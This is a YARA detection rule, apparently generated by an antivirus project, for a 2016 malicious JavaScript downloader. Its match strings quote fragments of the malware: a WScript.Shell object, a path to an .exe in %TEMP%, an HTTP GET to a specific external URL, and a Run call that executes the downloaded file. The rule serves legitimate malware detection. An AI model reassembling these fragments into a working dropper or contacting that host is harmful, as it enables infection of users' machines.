rule sig_20160329_0f6fa58f6b447c7b128c8d8dea98671d {
  meta:
    description = "datamaliciousorder - file 20160329_0f6fa58f6b447c7b128c8d8dea98671d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "33d68d8dc9fb32122844ead7f0e972ceeef2a98eea447bfd22da2ef9b4fec144"

  strings:
    $s1  = "function Lvbxyjk() {return Qdpnymyhg[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"5OUBQ95UBpPVcb.exe\";};" fullword ascii
    $s2  = "do {WScript[Wjxdyl](Rtzxf() * 11)} while (Lixxyva[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Ojapousua(Upmqggind, Ogjcb){return Upmqggind - Ogjcb;};" fullword ascii
    $s4  = "var Qdpnymyhg = function Smhfaxu() {return WScript[Qittjnvdo](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Lixxyva[Vquxvfn](\"GET\", \"http://www.qubefurniture.co.uk/lsd3ka\", false);" fullword ascii
    $s6  = "function Upnvev(Knoqcicw){Qdpnymyhg[\"Run\"](Knoqcicw, Knlurptlae, Knlurptlae);};" fullword ascii
    $s7  = "function Zswxmfysjg() {return ((Deqhyh == true) && (Deqhyh == Mqezztoo)) ? 1 : Knlurptlae;};" fullword ascii
    $s8  = "return Ojapousua(Wsrgpctmyn, Haerdqam);" fullword ascii
    $s9  = "var Mqezztoo = false;" fullword ascii
    $s10 = "function Hsaxaqxk()" fullword ascii
    $s11 = "var Kwwmyizk = false;" fullword ascii
    $s12 = "Mqezztoo = true; " fullword ascii
    $s13 = "function Rtzxf(){return 22;};" fullword ascii
    $s14 = "var Deqhyh = false;" fullword ascii
    $s15 = "function Kdvnetzll(){return Qittjnvdo;};" fullword ascii
    $s16 = "var Zxxzo = new this[\"Date\"]();" fullword ascii
    $s17 = " while (Fuqnq){" fullword ascii
    $s18 = "function Sgpdxy(){return Xljsisasz;};" fullword ascii
    $s19 = "Deqhyh = true; " fullword ascii
    $s20 = "} catch(Ajkorwdxyd){Fuqnq = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}